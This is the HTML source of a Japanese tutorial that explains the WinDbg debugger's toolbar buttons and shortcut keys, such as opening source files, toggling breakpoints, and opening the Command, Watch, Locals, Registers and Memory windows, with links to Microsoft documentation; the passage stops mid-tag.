&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/keyboard-shortcuts&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Keyboard Shortcuts - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-open-souce-file-ctrloキー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#1-open-souce-file-ctrlo%E3%82%AD%E3%83%BC&quot; aria-label=&quot;1 open souce file ctrloキー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;1. Open Souce File ([Ctrl+O]キー)&lt;/h3&gt;
&lt;p&gt;ツールバーの一番左端にある1番のボタンは、&lt;code class=&quot;language-text&quot;&gt;Open Source File&lt;/code&gt;ボタンです。&lt;/p&gt;
&lt;p&gt;このボタンをクリックすると、エクスプローラーウィンドウが開き、ソースファイルをWinDbgで開くことができます。
※ 実行ファイルやプロセスへのアタッチはできません。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/file---open-source-file&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;File Open Source File - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Ctrl+O]キーです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 744px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c11b3c7a6d89e57fce4fbcb368896b9f/cab8c/image.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 96.25000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAACwElEQVQ4y62Ua2/aMBSG87/3adrUv7KOW7ijtZ1QK6103dgaoAwIuZSkISEJhFshIfDONoShimrVNEsvxwc7j4/tc8wZpgXP8zAej5mlms1mmM/n8H3/1VqtVgjDENxPoQZN12EYBmzbxnQ6ZfDJZMKgFB4tEPlTpq2/XC7RbDaRyWRQLpfBtdttWJYFRZHRM4cY2A6mBEZXXSwWTMuddd0RNK0Dx1bwaI3IouM9MBaLMSgnd0WozhS6PcLQdeG4Hgvf9wMEQQCfiPo0Gp3s5Olpgc1mw3bhkPm0iaKIVCqFYrEIThLbaOhDiPoA3miEh55OIiFgJ5LD/MHARk/rkZ0orE+PR9M0mKaJer0Bnk8hn8+D68kiytIEd5oHhD5bkUbwkqLxNdV6zXxJkpBMJlEoFMB1JQWucQfXFBGs1vsPnjf61x68848CZUmG3lehGz2Eq/CvER7qKFCRuug5MyiWh/Uq+A9AWYJGbtgYOOQ2Xw988QxVEmFNtdDV+tiEIf6lybL8B9ghObR8IhVAknlE0oYmORVNh6hvWSbzD6UbfQy9MeYLH/XGPXiSh9tLIfSAJC7NeMex0Wq1YFJgv0/ybcDycDgcYryrc2pHxK9Lj7iqNnFzr+LqVkAmzW/zUBAEVse0CuhZfK9WIbV/4cO1gjfpLk5KMk4u+nh3YeH9hUlk4e1ZHxWhjdrdDwi1GiqVCtLp9BaYSCRYHVLF43EkSeixj6coXt7ia8vAdV3F/eMEXTeAaPsQHR8dYk9TWSTiMdDv6fnlcrktkO77ubLZLG5uv0FTZZh6D7PxKErvvS19OmeQ6BsKoz5Hfw5FB+ircfXlBu22iAl5zo61fOkMWTIvAu0jPAbMkQjPP1+iKjTQIaUpyg9E6k4P6BCbLZTI/OweSC0DRp1I0SDdNj1onufZ08TvFPX3ix/AqH4DkP5bgP7PKQEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/c11b3c7a6d89e57fce4fbcb368896b9f/8ac56/image.webp 240w,
/static/c11b3c7a6d89e57fce4fbcb368896b9f/d3be9/image.webp 480w,
/static/c11b3c7a6d89e57fce4fbcb368896b9f/43142/image.webp 744w&quot;
              sizes=&quot;(max-width: 744px) 100vw, 744px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/c11b3c7a6d89e57fce4fbcb368896b9f/8ff5a/image.png 240w,
/static/c11b3c7a6d89e57fce4fbcb368896b9f/e85cb/image.png 480w,
/static/c11b3c7a6d89e57fce4fbcb368896b9f/cab8c/image.png 744w&quot;
            sizes=&quot;(max-width: 744px) 100vw, 744px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/c11b3c7a6d89e57fce4fbcb368896b9f/cab8c/image.png&quot;
            alt=&quot;image-20211004094912087&quot;
            title=&quot;image-20211004094912087&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ソースファイルを開くと、以下のようにWinDbg上でソースファイルの中のソースコードを参照することができます。
※ これは読み取り専用であり、書き込みはできません。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 299px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/01d3f515f70810b9c6bd7fcf58b31018/aeb78/image-20211004095157514.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 102.91666666666669%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAAAsTAAALEwEAmpwYAAAClUlEQVQ4y+1Ua1PaUBDNX+6v6IdWW/3UT52ORVEiPtuZPkRAQMtDQWDGcSY8k5AQkmASEMIjp5tU5anjD+jOnNm92XtPdpOzlzm5SELkeUgNCQ1Rgq5raCoKFAIvCNDbOiRJQq1Wh6a34ZrjOM+CucjfEFkDTVlBvVonL6PVakGWJYiiiDvD8GKer0PV9CfCR3OcMcbjCRhTv/MSIi9gMBzAMkwoROia+yJJbGA0cmAad14HQl2APRyiramoUQHzxpxFfyOVSuE8cY7Lyytk0hkkKM5ms0jEE4idxfAnmUI6nfbWbu4qm8NlJoN4LIHcdR6FQgH5fMHzzPraG2x8+YSjgwPsB1ns7bJgA9tgd/wUB3CwF0SQ3cHuA/Zoz6M/3Kcc7XHhnguyATD+bzFsHkXgOwx72DyO0Dr8sD6Fj2J3vfXwfCbnITwDZp2N4oM/hFX/KVa2fmF1K4QVXxQftyN47wthLXCOdcK7ryd4+/kn7Y1i45SDL1JaCuZ76BahRA3RZBk/ImWcJTlCDuGLrId4uoh4pojcTQVZgusLnIhiqUEQF8AIfA/0w2CZQFMCRkOgY7WhthQPlmmg27HwWmNkeUBaI7KmQHoTSNQy+n17YeOYtOfB1ZvnncmzKTAcp+L+niqkEnXSpGlaRNiHQwcn4qUpGI2eBD3vZyrs9TpeIAg8TYZAE1GjSmV0SdRGqQSzUkFPVaGRxjo0ihZNj0HTMz2CM4RDUr1rPC+hWLxFJnONOt+ARuPWqVRhVquwaNb7ND1Wu03f15ohWiDsdv9VWKs5KJfH4LgxVdqHpimTlqfbnzq8tGWV2nkuifnDS77hQoWDwWAu6bx4Pb30QzxC2+7P3XHL41fr0LbtV7X8n/BZ+wuQyiKaGETlqAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/01d3f515f70810b9c6bd7fcf58b31018/8ac56/image-20211004095157514.webp 240w,
/static/01d3f515f70810b9c6bd7fcf58b31018/cf880/image-20211004095157514.webp 299w&quot;
              sizes=&quot;(max-width: 299px) 100vw, 299px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/01d3f515f70810b9c6bd7fcf58b31018/8ff5a/image-20211004095157514.png 240w,
/static/01d3f515f70810b9c6bd7fcf58b31018/aeb78/image-20211004095157514.png 299w&quot;
            sizes=&quot;(max-width: 299px) 100vw, 299px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/01d3f515f70810b9c6bd7fcf58b31018/aeb78/image-20211004095157514.png&quot;
            alt=&quot;image-20211004095157514&quot;
            title=&quot;image-20211004095157514&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-insert-or-remove-breakpoint-f9キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#2-insert-or-remove-breakpoint-f9%E3%82%AD%E3%83%BC&quot; aria-label=&quot;2 insert or remove breakpoint f9キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;2. Insert or remove breakpoint ([F9]キー)&lt;/h3&gt;
&lt;p&gt;2番のボタンは、&lt;code class=&quot;language-text&quot;&gt;Insert or remove breakpoint&lt;/code&gt;です。&lt;/p&gt;
&lt;p&gt;アクティブなウィンドウがSourceウィンドウか、Disassemblyウィンドウのときのみ利用可能です。&lt;/p&gt;
&lt;p&gt;このボタンを任意の箇所を選択した状態で押すことで、ブレークポイントの設定を切り替えることができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは、[F9]キーです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/edit---breakpoints&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Edit Breakpoints - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;例えば、次の例では、メモ帳アプリの&lt;code class=&quot;language-text&quot;&gt;notepad!wWinMain&lt;/code&gt;にブレークポイントが設定されています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 827px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9e742535d0952d27bb42e42a2c33e5bb/4e6ec/image-1.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACc0lEQVQ4y41UaXPaMBD1//8h/dR2SpurkGAwBEomCSUTfBuDHaIANrdtsA2vK9F2SDOdiTRv3q5krfaSJdXqYTJ6wYjwwhjhGWEYIAwCzOdTIUfrNbIsQ5qmyAjpljhLkeeE7DfyA6SPha8olRVcynWcFxV8L1ZROLnCt/MySrR2VW3g4pL2SjWc0X5J5vo1TstNnJVkWpch15qEHwLSh9MaCuVbnCgdFCptXDRVyHcOwRaotB2U7yzI97YAl5WOi+pPF5V7B9V2T8gK10mWlMYNbNOApnahdh9h6BpGLwyr5ULwZDyCRfuc2fMQz8MnSsFKIIkjxNFaMNezdAvpSmnAtixoug7DMNDtduF5HpbLJYbDocDDwwMY5dft9xGEIaIoxoryGicJojhGQsz1PM8h8bgtyxQGVVXFZDIBH/yj8XiMxWJBhQnx3iHJyg/YhgVd1clTG5tkczAYJZgGU2SbTOj7/f5dkOSbJswnyuFAIzZB2TgYpBkmITY0dzSxf230+JJjWWp9bsP7MoD9yQa7YEjvUqAFZNcZ4lqMvJED1tvQ/hh6E3K9cIt+0YVT7KF/2cdj4RGz6xnSTop5a45ACWBXbHi+J4rGi/SvV69CLrcaMAY6NFeD4RlwmStC5KH6oQ+2YGBTRq9mLgrGq/8/74SH1XqLimLCJFimRb2oYjwaIxgHYEOGYBLA93xhcLfbidbg4M+Q83a7/Qu+Jsl1KgqFousGtY+FTqcjPOGtEtB75q2jaRrW1GfcO95GMfUel1erlQDfi6JIsNS4uadGHsB1Xfi+D8dxDj8B+hlwg7PZDL1eT1zCD/ODx8y/Ox6/ABN9DwDfehLgAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/9e742535d0952d27bb42e42a2c33e5bb/8ac56/image-1.webp 240w,
/static/9e742535d0952d27bb42e42a2c33e5bb/d3be9/image-1.webp 480w,
/static/9e742535d0952d27bb42e42a2c33e5bb/97d4f/image-1.webp 827w&quot;
              sizes=&quot;(max-width: 827px) 100vw, 827px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/9e742535d0952d27bb42e42a2c33e5bb/8ff5a/image-1.png 240w,
/static/9e742535d0952d27bb42e42a2c33e5bb/e85cb/image-1.png 480w,
/static/9e742535d0952d27bb42e42a2c33e5bb/4e6ec/image-1.png 827w&quot;
            sizes=&quot;(max-width: 827px) 100vw, 827px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/9e742535d0952d27bb42e42a2c33e5bb/4e6ec/image-1.png&quot;
            alt=&quot;image-1.png&quot;
            title=&quot;image-1.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここで、ブレークポイントに設定された箇所（色のついた行）にカーソルを置いた状態で&lt;code class=&quot;language-text&quot;&gt;Insert or remove breakpoint&lt;/code&gt;ボタンか、[F9]キーを押すことで、ブレークポイント設定を解除できます。&lt;/p&gt;
&lt;p&gt;逆に、ブレークポイントに設定されていない箇所（色のついていない行）でこのボタンを実行することで、新たなブレークポイントを設定することもできます。&lt;/p&gt;
&lt;h3 id=&quot;3-command-alt1キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#3-command-alt1%E3%82%AD%E3%83%BC&quot; aria-label=&quot;3 command alt1キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;3. Command ([Alt+1]キー)&lt;/h3&gt;
&lt;p&gt;Commandウィンドウが閉じている状態で3番のボタンをクリックすることで、新たにCommandウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Alt+1]キーです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/view---command&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;View Command - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/957ad5924b85df6a78fb8aaf1bf5fd68/99375/image-2.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAABX0lEQVQ4y62S626CQBBGef93apPGWBMRqtwE8RIVUbGFcL8ofJ1dg7a/1NZNTmaW7J6d2UV46bzjtdMnRLz1ZHTFEaGiJ2l4lw10ByP0hzpExYA4uo0gqROYszVUcw7VWsCwl9CJpfuJ9T7Aehec450IlmUhDHykcYQ0iRBHIfIsxV+HIA5kTCZUpWliOp3BcTaYzxcUHbiuizRN0dDCuq6J5kzTXPOf3whB+hiSaApN06AoCs91XYckSXweBMHd1TVMKJOQta2qKsbjMVarFWzb5gewypMkwel0QlVVF47H4685g8l4y6pukNDk7fm+zyuKooi3mmUZ8jxHWZYXCYvtASxvuQo1HQfPQxzHXBKGIYdtaiXt4lvt8pa9wxeCOEMYp7S55Bfcioqi4PGhVw6jmMz1paL/IjibLSXVU2RcuPMOeOYQdvsnC93tHgX9FmVJj/AA7fqcHo6R5We+AWYCM1ya5np/AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/957ad5924b85df6a78fb8aaf1bf5fd68/8ac56/image-2.webp 240w,
/static/957ad5924b85df6a78fb8aaf1bf5fd68/d3be9/image-2.webp 480w,
/static/957ad5924b85df6a78fb8aaf1bf5fd68/e46b2/image-2.webp 960w,
/static/957ad5924b85df6a78fb8aaf1bf5fd68/f992d/image-2.webp 1440w,
/static/957ad5924b85df6a78fb8aaf1bf5fd68/305dd/image-2.webp 1525w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/957ad5924b85df6a78fb8aaf1bf5fd68/8ff5a/image-2.png 240w,
/static/957ad5924b85df6a78fb8aaf1bf5fd68/e85cb/image-2.png 480w,
/static/957ad5924b85df6a78fb8aaf1bf5fd68/d9199/image-2.png 960w,
/static/957ad5924b85df6a78fb8aaf1bf5fd68/07a9c/image-2.png 1440w,
/static/957ad5924b85df6a78fb8aaf1bf5fd68/99375/image-2.png 1525w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/957ad5924b85df6a78fb8aaf1bf5fd68/d9199/image-2.png&quot;
            alt=&quot;image-2.png&quot;
            title=&quot;image-2.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;4-watch-alt2キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#4-watch-alt2%E3%82%AD%E3%83%BC&quot; aria-label=&quot;4 watch alt2キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;4. Watch （[Alt+2]キー）&lt;/h3&gt;
&lt;p&gt;4番のボタンをクリックすることで、Watchウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Alt+2]キーです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/view---watch&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;View Watch - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Watchウィンドウには、グローバル変数、ローカル変数、レジスタに関する情報が表示されます。
Watchウィンドウの詳細については以下のドキュメントを参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/watch-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ウォッチ ウィンドウの使用 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;5-locals-alt3キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#5-locals-alt3%E3%82%AD%E3%83%BC&quot; aria-label=&quot;5 locals alt3キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;5. Locals （[Alt+3]キー）&lt;/h3&gt;
&lt;p&gt;5番のボタンをクリックすることで、Localsウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Alt+3]キーです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/view---locals&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ローカルの表示 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Localsウィンドウでは、ローカル変数を一覧することができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/locals-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg でのローカル変数の表示と編集 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;6-registers-alt4キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#6-registers-alt4%E3%82%AD%E3%83%BC&quot; aria-label=&quot;6 registers alt4キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;6. Registers （[Alt+4]キー）&lt;/h3&gt;
&lt;p&gt;6番のボタンをクリックすることで、Registersウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Alt+4]キーです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/view---registers&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;レジスタの表示 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Registersウィンドウを用いたレジスタの表示と編集方法については、以下のドキュメントを参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/registers-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg でのレジスタの表示と編集 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;7-memory-window-alt5キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#7-memory-window-alt5%E3%82%AD%E3%83%BC&quot; aria-label=&quot;7 memory window alt5キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;7. Memory Window （[Alt+5]キー）&lt;/h3&gt;
&lt;p&gt;7番のボタンをクリックすることで、Memoryウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Alt+5]キーです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/view---memory&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;メモリの表示 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
